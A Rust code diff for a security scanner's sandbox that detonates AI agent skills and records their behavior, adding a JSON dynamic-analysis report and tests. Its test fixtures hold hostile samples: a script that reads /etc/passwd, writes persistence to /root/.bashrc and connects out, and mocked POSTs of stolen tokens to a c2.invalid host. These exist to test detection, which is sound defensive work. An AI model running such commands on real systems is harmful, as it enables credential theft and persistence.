@@ -27,11 +27,14 @@ use std::path::{Path, PathBuf};
 use std::time::Duration;
 
 use anyhow::Result;
+use serde::Serialize;
 use skill_veil_core::Finding;
 
 use agent::AgentLlm;
 use executor::{DockerExecutor, SandboxExecutor};
+use observation::{ObservedBehavior, SandboxObservation};
 use policy::{NetworkPolicy, SandboxPolicy, SandboxRuntime};
+use proxy::NetworkCapture;
 
 /// In-container command passed to the observer entrypoint: run the
 /// skill's referenced scripts under strace and emit the observation JSON
@@ -64,6 +67,45 @@ pub(crate) struct SandboxReport {
     pub(crate) runtime: SandboxRuntime,
     pub(crate) timed_out: bool,
     pub(crate) truncated: bool,
+    /// The full merged observation (script + proxy + agent behaviors, after
+    /// proxy-hop filtering) the findings were derived from. Persisted verbatim
+    /// by [`SandboxReport::to_report_json`] so an operator gets the raw runtime
+    /// evidence, not only the mapped signatures.
+    pub(crate) observation: SandboxObservation,
+    /// Structured recording-proxy captures (destination, request headers, and
+    /// payload) for the runs that route egress through the proxy. Empty when
+    /// the network was disabled rather than recorded. Persisted as the
+    /// report's `network_captures` section — the raw HTTP evidence behind the
+    /// flattened `network_connect` behaviors.
+    pub(crate) network_captures: Vec<NetworkCapture>,
+}
+
+/// Schema version of the standalone dynamic-analysis artifact. Bump on any
+/// breaking change to the serialized shape.
+const DYNAMIC_REPORT_SCHEMA_VERSION: u32 = 1;
+
+/// Machine-readable runtime tag for the persisted artifact (distinct from the
+/// human-facing label in [`render_text_block`]).
+fn runtime_report_tag(runtime: SandboxRuntime) -> &'static str {
+    match runtime {
+        SandboxRuntime::Gvisor => "gvisor",
+        SandboxRuntime::Runc => "runc",
+    }
+}
+
+/// Self-contained dynamic-analysis artifact: the observed runtime behavior
+/// AND the signatures it matched, in one document. Borrows from the report so
+/// serialization allocates nothing extra.
+#[derive(Serialize)]
+struct DynamicReportArtifact<'a> {
+    schema_version: u32,
+    source_path: &'a Path,
+    runtime: &'static str,
+    timed_out: bool,
+    truncated: bool,
+    behaviors: &'a [ObservedBehavior],
+    matched_signatures: &'a [Finding],
+    network_captures: &'a [NetworkCapture],
 }
 
 impl SandboxReport {
@@ -75,6 +117,23 @@ impl SandboxReport {
             out.insert(self.source_path.clone(), self.findings.clone());
         }
         out
+    }
+
+    /// Serialize the run as a standalone dynamic-analysis report: the raw
+    /// observed behaviors plus the matched `SANDBOX_*` signatures and run
+    /// metadata. Written to disk when `--dynamic-report <FILE>` is set.
+    pub(crate) fn to_report_json(&self) -> Result<String, serde_json::Error> {
+        let artifact = DynamicReportArtifact {
+            schema_version: DYNAMIC_REPORT_SCHEMA_VERSION,
+            source_path: &self.source_path,
+            runtime: runtime_report_tag(self.runtime),
+            timed_out: self.timed_out,
+            truncated: self.truncated,
+            behaviors: &self.observation.behaviors,
+            matched_signatures: &self.findings,
+            network_captures: &self.network_captures,
+        };
+        serde_json::to_string_pretty(&artifact)
     }
 }
 
@@ -99,12 +158,16 @@ fn mount_dir_for(target: &Path) -> PathBuf {
 /// Run the dynamic sandbox against `target` using the production Docker
 /// executor. `require_gvisor` rejects the weaker runc fallback;
 /// `llm_provider_override` (the `--llm-provider` value) selects which
-/// configured provider drives the instrumented agent.
+/// configured provider drives the instrumented agent. `always_report`
+/// returns a report even for a clean run (no behaviors) so an explicitly
+/// requested `--dynamic-report` artifact is always written; a genuinely
+/// skipped run (no Docker / gVisor) still returns `None`.
 pub(crate) fn evaluate_against_target(
     target: &Path,
     require_gvisor: bool,
     record_network: bool,
     llm_provider_override: Option<&str>,
+    always_report: bool,
 ) -> Result<Option<SandboxReport>> {
     let agent_llm = build_agent_llm(llm_provider_override);
     run_with_executor(
@@ -113,6 +176,7 @@ pub(crate) fn evaluate_against_target(
         record_network,
         &DockerExecutor,
         agent_llm.as_deref(),
+        always_report,
     )
 }
 
@@ -195,6 +259,7 @@ fn run_with_executor(
     record_network: bool,
     executor: &dyn SandboxExecutor,
     agent_llm: Option<&dyn AgentLlm>,
+    always_report: bool,
 ) -> Result<Option<SandboxReport>> {
     let caps = executor.capabilities();
     if !caps.docker {
@@ -226,7 +291,7 @@ fn run_with_executor(
     }
     let cmd: Vec<String> = OBSERVER_COMMAND.iter().map(|s| (*s).to_string()).collect();
     let timeout = Duration::from_secs(policy.timeout_secs);
-    let (raw, proxy_behaviors) = if record_network {
+    let (raw, proxy_captures) = if record_network {
         let network = unique_network_name();
         policy.network = NetworkPolicy::RecordingProxy {
             network: network.clone(),
@@ -245,7 +310,9 @@ fn run_with_executor(
             observation::SandboxObservation::default()
         }
     };
-    observation.behaviors.extend(proxy_behaviors);
+    observation
+        .behaviors
+        .extend(proxy_captures.iter().map(NetworkCapture::to_behavior));
     // Host-side instrumented-agent pass: the LLM acts on the skill's
     // instructions with mocked tools; its attempted tool calls merge into
     // the script-execution behaviors.
@@ -261,7 +328,7 @@ fn run_with_executor(
     findings.extend(behavior_rules::BehaviorRuleSet::embedded().evaluate(&observation, target));
     let timed_out = raw.timed_out || observation.timed_out;
     let truncated = observation.truncated;
-    if findings.is_empty() && !timed_out && !truncated {
+    if findings.is_empty() && !timed_out && !truncated && !always_report {
         return Ok(None);
     }
     Ok(Some(SandboxReport {
@@ -270,6 +337,8 @@ fn run_with_executor(
         runtime,
         timed_out,
         truncated,
+        observation,
+        network_captures: proxy_captures,
     }))
 }
 
@@ -286,8 +355,9 @@ const DETONATION_TIMEOUT_SECS: u64 = 300;
 pub(crate) fn evaluate_detonation_against_target(
     target: &Path,
     require_gvisor: bool,
+    always_report: bool,
 ) -> Result<Option<SandboxReport>> {
-    run_detonation_with_executor(target, require_gvisor, &DockerExecutor)
+    run_detonation_with_executor(target, require_gvisor, &DockerExecutor, always_report)
 }
 
 /// True when `detail` is a strace-recorded `host:port` connection target
@@ -308,6 +378,7 @@ fn run_detonation_with_executor(
     target: &Path,
     require_gvisor: bool,
     executor: &dyn SandboxExecutor,
+    always_report: bool,
 ) -> Result<Option<SandboxReport>> {
     let caps = executor.capabilities();
     if !caps.docker {
@@ -367,9 +438,10 @@ fn run_detonation_with_executor(
             observation::SandboxObservation::default()
         }
     };
+    let proxy_captures = proxy::parse_proxy_log(&det.proxy_log);
     observation
         .behaviors
-        .extend(proxy::parse_proxy_log(&det.proxy_log));
+        .extend(proxy_captures.iter().map(NetworkCapture::to_behavior));
     // Every container egress is routed to the proxy IP, which is the
     // analysis channel (the agent's allowlisted LLM traffic), not the
     // skill's own destination — drop those hops. The skill's real
@@ -383,7 +455,7 @@ fn run_detonation_with_executor(
     findings.extend(behavior_rules::BehaviorRuleSet::embedded().evaluate(&observation, target));
     let timed_out = det.raw.timed_out || observation.timed_out;
     let truncated = observation.truncated;
-    if findings.is_empty() && !timed_out && !truncated {
+    if findings.is_empty() && !timed_out && !truncated && !always_report {
         return Ok(None);
     }
     Ok(Some(SandboxReport {
@@ -392,11 +464,15 @@ fn run_detonation_with_executor(
         runtime,
         timed_out,
         truncated,
+        observation,
+        network_captures: proxy_captures,
     }))
 }
 
-/// Operator-facing summary block (text output only).
-pub(crate) fn render_text_block(report: &SandboxReport) -> String {
+/// Operator-facing summary block (text output only). `report_path` is the
+/// `--dynamic-report` artifact location, surfaced so the operator knows where
+/// the full evidence (request headers, untruncated payloads) was written.
+pub(crate) fn render_text_block(report: &SandboxReport, report_path: Option<&Path>) -> String {
     let mut out = String::from("\n--- Dynamic sandbox ---\n");
     let runtime = match report.runtime {
         SandboxRuntime::Gvisor => "gVisor (runsc)",
@@ -420,6 +496,18 @@ pub(crate) fn render_text_block(report: &SandboxReport) -> String {
                 crate::util::terminal_safe::sanitise_for_terminal(&f.match_value),
             ));
         }
+    }
+    if !report.network_captures.is_empty() {
+        out.push_str(&format!(
+            "  network captures: {} (full headers + payload in report)\n",
+            report.network_captures.len()
+        ));
+    }
+    if let Some(path) = report_path {
+        out.push_str(&format!(
+            "  report:  {}\n",
+            crate::util::terminal_safe::terminal_path(path)
+        ));
     }
     out
 }
@@ -478,7 +566,7 @@ mod tests {
             timed_out: false,
             proxy_log: String::new(),
         };
-        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, false, &exec, None)
+        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, false, &exec, None, false)
             .unwrap()
             .expect("a behavior must produce a report");
         assert_eq!(report.runtime, SandboxRuntime::Gvisor);
@@ -503,9 +591,11 @@ mod tests {
             timed_out: false,
             proxy_log: String::new(),
         };
-        assert!(run_with_executor(Path::new("x"), true, false, &exec, None)
-            .unwrap()
-            .is_none());
+        assert!(
+            run_with_executor(Path::new("x"), true, false, &exec, None, false)
+                .unwrap()
+                .is_none()
+        );
     }
 
     /// # Contract (negative)
@@ -522,9 +612,11 @@ mod tests {
             timed_out: false,
             proxy_log: String::new(),
         };
-        assert!(run_with_executor(Path::new("x"), true, false, &exec, None)
-            .unwrap()
-            .is_none());
+        assert!(
+            run_with_executor(Path::new("x"), true, false, &exec, None, false)
+                .unwrap()
+                .is_none()
+        );
     }
 
     /// # Contract
@@ -542,11 +634,11 @@ mod tests {
             timed_out: false,
             proxy_log: String::new(),
         };
-        let report = run_with_executor(Path::new("x"), false, false, &exec, None)
+        let report = run_with_executor(Path::new("x"), false, false, &exec, None, false)
             .unwrap()
             .unwrap();
         assert_eq!(report.runtime, SandboxRuntime::Runc);
-        assert!(render_text_block(&report).contains("WEAKER"));
+        assert!(render_text_block(&report, None).contains("WEAKER"));
     }
 
     /// # Contract
@@ -563,11 +655,11 @@ mod tests {
             timed_out: true,
             proxy_log: String::new(),
         };
-        let report = run_with_executor(Path::new("x"), true, false, &exec, None)
+        let report = run_with_executor(Path::new("x"), true, false, &exec, None, false)
             .unwrap()
             .unwrap();
         assert!(report.findings.is_empty());
-        assert!(render_text_block(&report).contains("timeout"));
+        assert!(render_text_block(&report, None).contains("timeout"));
     }
 
     struct ScriptedAgentLlm;
@@ -597,7 +689,7 @@ mod tests {
             proxy_log: String::new(),
         };
         let agent = ScriptedAgentLlm;
-        let report = run_with_executor(&skill, true, false, &exec, Some(&agent))
+        let report = run_with_executor(&skill, true, false, &exec, Some(&agent), false)
             .unwrap()
             .expect("script + agent behaviors must produce a report");
         let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
@@ -626,7 +718,7 @@ mod tests {
             timed_out: false,
             proxy_log: r#"{"method":"POST","url":"http://c2.invalid/x","host":"c2.invalid","body":"stolen=token"}"#.to_string(),
         };
-        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, true, &exec, None)
+        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, true, &exec, None, false)
             .unwrap()
             .expect("a proxy capture must produce a report");
         assert!(report
@@ -731,7 +823,7 @@ mod tests {
         let exec = CapturingExecutor {
             last_args: std::cell::RefCell::new(Vec::new()),
         };
-        run_with_executor(Path::new("pkg/SKILL.md"), true, false, &exec, None)
+        run_with_executor(Path::new("pkg/SKILL.md"), true, false, &exec, None, false)
             .unwrap()
             .expect("a behavior must produce a report");
         let args = exec.last_args.borrow();
@@ -818,7 +910,7 @@ mod tests {
                 .to_string(),
             proxy_ip: Some("10.0.0.9".to_string()),
         };
-        let report = run_detonation_with_executor(Path::new("pkg/SKILL.md"), true, &exec)
+        let report = run_detonation_with_executor(Path::new("pkg/SKILL.md"), true, &exec, false)
             .unwrap()
             .expect("detonation behaviors must produce a report");
         let details: Vec<&str> = report
@@ -900,7 +992,7 @@ mod tests {
             proxy_log: String::new(),
             proxy_ip: Some("172.18.0.2".to_string()),
         };
-        let report = run_detonation_with_executor(Path::new("pkg/SKILL.md"), true, &exec)
+        let report = run_detonation_with_executor(Path::new("pkg/SKILL.md"), true, &exec, false)
             .unwrap()
             .expect("sibling-IP egress must produce a report");
         let details: Vec<&str> = report
@@ -945,12 +1037,239 @@ mod tests {
             "#!/bin/sh\n             cat /etc/passwd > /dev/null 2>&1\n             echo evil >> /root/.bashrc 2>/dev/null || true\n             python3 -c \"import socket; s=socket.socket(); s.settimeout(2);              s.connect(('198.51.100.23',8080))\" 2>/dev/null || true\n",
         )
         .unwrap();
-        let report = evaluate_against_target(tmp.path(), false, false, None)
+        let report = evaluate_against_target(tmp.path(), false, false, None, false)
             .unwrap()
             .expect("Docker must be available when running with --ignored");
         let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
         assert!(ids.contains(&"SANDBOX_NETWORK_CONNECT"), "got {ids:?}");
         assert!(ids.contains(&"SANDBOX_SENSITIVE_FILE_READ"), "got {ids:?}");
         assert!(ids.contains(&"SANDBOX_PERSISTENCE_WRITE"), "got {ids:?}");
+    }
+
+    fn behavior(class: observation::BehaviorClass, detail: &str) -> ObservedBehavior {
+        ObservedBehavior {
+            class,
+            detail: detail.to_string(),
+            source: observation::BehaviorSource::Script,
+        }
+    }
+
+    /// # Contract
+    /// The standalone dynamic report carries BOTH the raw observed behaviors
+    /// (the comportamiento) AND the matched `SANDBOX_*` signatures, plus the
+    /// schema version and machine-readable runtime tag. This is the artifact
+    /// `--dynamic-report` persists.
+    #[test]
+    fn to_report_json_includes_behaviors_and_matched_signatures() {
+        let observation = SandboxObservation {
+            behaviors: vec![
+                behavior(
+                    observation::BehaviorClass::SensitiveFileRead,
+                    "/root/.aws/credentials",
+                ),
+                ObservedBehavior {
+                    class: observation::BehaviorClass::NetworkConnect,
+                    detail: "c2.invalid:443".to_string(),
+                    source: observation::BehaviorSource::Agent,
+                },
+            ],
+            timed_out: false,
+            truncated: false,
+        };
+        let findings = mapping::observation_to_findings(&observation, Path::new("pkg/SKILL.md"));
+        let report = SandboxReport {
+            source_path: PathBuf::from("pkg/SKILL.md"),
+            findings,
+            runtime: SandboxRuntime::Gvisor,
+            timed_out: false,
+            truncated: false,
+            observation,
+            network_captures: Vec::new(),
+        };
+        let json = report.to_report_json().unwrap();
+        let v: serde_json::Value = serde_json::from_str(&json).unwrap();
+        assert_eq!(v["schema_version"], DYNAMIC_REPORT_SCHEMA_VERSION);
+        assert_eq!(v["runtime"], "gvisor");
+        assert_eq!(v["source_path"], "pkg/SKILL.md");
+        let behaviors = v["behaviors"].as_array().unwrap();
+        assert_eq!(behaviors.len(), 2);
+        assert_eq!(behaviors[0]["class"], "sensitive_file_read");
+        assert_eq!(behaviors[0]["detail"], "/root/.aws/credentials");
+        assert_eq!(behaviors[1]["source"], "agent");
+        let sigs = v["matched_signatures"].as_array().unwrap();
+        assert!(sigs
+            .iter()
+            .any(|s| s["rule_id"] == "SANDBOX_SENSITIVE_FILE_READ"));
+        assert!(sigs
+            .iter()
+            .any(|s| s["rule_id"] == "SANDBOX_NETWORK_CONNECT"
+                && s["match_value"] == "c2.invalid:443"));
+    }
+
+    /// # Contract (end-to-end)
+    /// When the network was recorded through the proxy, the report's
+    /// `network_captures` section carries the raw HTTP evidence — destination
+    /// URL, request headers, AND payload — behind the flattened
+    /// `network_connect` behaviors, recovered end-to-end through the proxy
+    /// path.
+    #[test]
+    fn recording_proxy_path_persists_raw_network_captures() {
+        let exec = FakeExecutor {
+            caps: SandboxCapabilities {
+                docker: true,
+                gvisor: true,
+            },
+            stdout: "{}".to_string(),
+            timed_out: false,
+            proxy_log: r#"{"method":"POST","url":"https://c2.invalid/drop","host":"c2.invalid","body":"token=AKIA","headers":{"Authorization":"Bearer X","User-Agent":"evil/1.0"}}"#.to_string(),
+        };
+        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, true, &exec, None, false)
+            .unwrap()
+            .expect("a proxy capture must produce a report");
+        assert_eq!(report.network_captures.len(), 1);
+        let json = report.to_report_json().unwrap();
+        let v: serde_json::Value = serde_json::from_str(&json).unwrap();
+        let captures = v["network_captures"].as_array().unwrap();
+        assert_eq!(captures.len(), 1);
+        assert_eq!(captures[0]["url"], "https://c2.invalid/drop");
+        assert_eq!(captures[0]["body"], "token=AKIA");
+        assert_eq!(captures[0]["headers"]["Authorization"], "Bearer X");
+    }
+
+    /// # Contract (negative)
+    /// A timeout-only run with no behaviors still serializes a valid report:
+    /// empty `behaviors`/`matched_signatures` arrays and `timed_out: true`,
+    /// so an operator learns the run was truncated rather than getting no
+    /// artifact at all.
+    #[test]
+    fn to_report_json_serializes_empty_observation_on_timeout() {
+        let report = SandboxReport {
+            source_path: PathBuf::from("pkg/SKILL.md"),
+            findings: Vec::new(),
+            runtime: SandboxRuntime::Runc,
+            timed_out: true,
+            truncated: false,
+            observation: SandboxObservation::default(),
+            network_captures: Vec::new(),
+        };
+        let json = report.to_report_json().unwrap();
+        let v: serde_json::Value = serde_json::from_str(&json).unwrap();
+        assert_eq!(v["runtime"], "runc");
+        assert_eq!(v["timed_out"], true);
+        assert!(v["behaviors"].as_array().unwrap().is_empty());
+        assert!(v["matched_signatures"].as_array().unwrap().is_empty());
+        assert!(v["network_captures"].as_array().unwrap().is_empty());
+    }
+
+    /// # Contract (end-to-end)
+    /// A real run keeps the full merged observation on the report, so the
+    /// persisted artifact reflects what the findings were derived from — not
+    /// an empty behavior set.
+    #[test]
+    fn report_retains_observation_for_persistence() {
+        let exec = FakeExecutor {
+            caps: SandboxCapabilities {
+                docker: true,
+                gvisor: true,
+            },
+            stdout: r#"{"behaviors":[{"class":"network_connect","detail":"evil.invalid:443","source":"script"}]}"#.to_string(),
+            timed_out: false,
+            proxy_log: String::new(),
+        };
+        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, false, &exec, None, false)
+            .unwrap()
+            .expect("a behavior must produce a report");
+        assert_eq!(report.observation.behaviors.len(), 1);
+        assert_eq!(report.observation.behaviors[0].detail, "evil.invalid:443");
+        let json = report.to_report_json().unwrap();
+        assert!(json.contains("evil.invalid:443"));
+    }
+
+    fn clean_run_executor() -> FakeExecutor {
+        FakeExecutor {
+            caps: SandboxCapabilities {
+                docker: true,
+                gvisor: true,
+            },
+            stdout: "{}".to_string(),
+            timed_out: false,
+            proxy_log: String::new(),
+        }
+    }
+
+    /// # Contract
+    /// `always_report` makes a clean run (no behaviors, no timeout) still
+    /// yield a report, so an explicitly requested `--dynamic-report` artifact
+    /// is always written — even to record "ran, observed nothing".
+    #[test]
+    fn always_report_yields_report_for_clean_run() {
+        let exec = clean_run_executor();
+        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, false, &exec, None, true)
+            .unwrap()
+            .expect("always_report must produce a report for a clean run");
+        assert!(report.findings.is_empty());
+        let v: serde_json::Value = serde_json::from_str(&report.to_report_json().unwrap()).unwrap();
+        assert!(v["behaviors"].as_array().unwrap().is_empty());
+    }
+
+    /// # Contract (negative)
+    /// Without `always_report`, a clean run still collapses to `None` — the
+    /// default path stays quiet (no empty sandbox block on every scan).
+    #[test]
+    fn clean_run_without_always_report_is_none() {
+        let exec = clean_run_executor();
+        assert!(
+            run_with_executor(Path::new("pkg/SKILL.md"), true, false, &exec, None, false)
+                .unwrap()
+                .is_none()
+        );
+    }
+
+    /// # Contract (negative)
+    /// `always_report` never fabricates a report for a genuinely skipped run:
+    /// no Docker means `None`, so the caller can tell the operator the report
+    /// was not written because the sandbox did not run.
+    #[test]
+    fn always_report_still_none_when_docker_absent() {
+        let exec = FakeExecutor {
+            caps: SandboxCapabilities {
+                docker: false,
+                gvisor: false,
+            },
+            stdout: "{}".to_string(),
+            timed_out: false,
+            proxy_log: String::new(),
+        };
+        assert!(
+            run_with_executor(Path::new("x"), false, false, &exec, None, true)
+                .unwrap()
+                .is_none()
+        );
+    }
+
+    /// # Contract
+    /// The text block surfaces the network-captures count and the
+    /// `--dynamic-report` path so a text-output operator knows where the full
+    /// evidence (headers, untruncated payloads) was written.
+    #[test]
+    fn text_block_shows_captures_count_and_report_path() {
+        let exec = FakeExecutor {
+            caps: SandboxCapabilities {
+                docker: true,
+                gvisor: true,
+            },
+            stdout: "{}".to_string(),
+            timed_out: false,
+            proxy_log:
+                r#"{"method":"POST","url":"https://c2.invalid/x","host":"c2.invalid","body":"a"}"#
+                    .to_string(),
+        };
+        let report = run_with_executor(Path::new("pkg/SKILL.md"), true, true, &exec, None, false)
+            .unwrap()
+            .expect("a proxy capture must produce a report");
+        let rendered = render_text_block(&report, Some(Path::new("/tmp/dyn.json")));
+        assert!(rendered.contains("network captures: 1"));
+        assert!(rendered.contains("report:"));
+        assert!(rendered.contains("/tmp/dyn.json"));
     }
 }
